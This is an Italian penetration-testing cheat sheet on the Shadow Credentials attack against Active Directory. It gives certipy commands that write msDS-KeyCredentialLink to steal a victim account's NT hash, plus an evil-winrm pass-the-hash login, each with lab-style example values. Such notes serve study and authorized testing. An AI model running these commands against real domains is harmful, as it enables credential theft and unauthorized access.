# Shadow Credentials (Windows)

| Caratteristica | Dettaglio |
| :--- | :--- |
| **Tool necessari** | `certipy`, `pywhisker`, `NetExec` |
| **SO Target** | Windows (Active Directory) |
| **Quando effettuare** | Se si ha il permesso di scrivere sull'attributo `msDS-KeyCredentialLink` di un oggetto |
| **Info Utili** | Ottenimento dell'hash NT di un oggetto senza conoscerne la password |

### Funzionamento
L'attacco permette di ottenere l'hash NT di un utente o di un computer settando l'attributo `msDS-KeyCredentialLink`. Questo attributo permette di simulare una registrazione di chiave pubblica per l'autenticazione tramite certificati, permettendo poi di richiedere un ticket Kerberos e l'hash NT.

### Esecuzione Attacco (Certipy)
Certipy automatizza tutto il processo (creazione chiave, settaggio attributo, richiesta TGT e dump hash).

**Comando Generico:**
```bash
certipy shadow auto -u '<USER_OWNER>' -p '<PASSWORD>' -account '<USER_VICTIM>' -dc-ip <DC_IP> -target <DC_HOSTNAME>
```
*Esempio:*
```bash
certipy shadow auto -u 'emily' -p 'Password123' -account 'sofia' -dc-ip 10.10.10.117 -target eh.local
```

### Autenticazione con Hash (Pass-the-Hash)
Una volta ottenuto l'hash, è possibile utilizzarlo per collegarsi via WinRM.
```bash
evil-winrm -i <IP> -u <USER> -H <NT_HASH>
```
*Esempio:*
```bash
evil-winrm -i 10.10.10.117 -u sofia -H b1820...
```

### URL Fondamentali
- [The Hacker Recipes - Shadow Credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
- [Certipy GitHub](https://github.com/ly4k/Certipy)
- [Medium - Shadow Credentials Attack](https://medium.com/@arianitisufi00/detect-pass-the-hash-lateral-movement-f6fb96f17618)
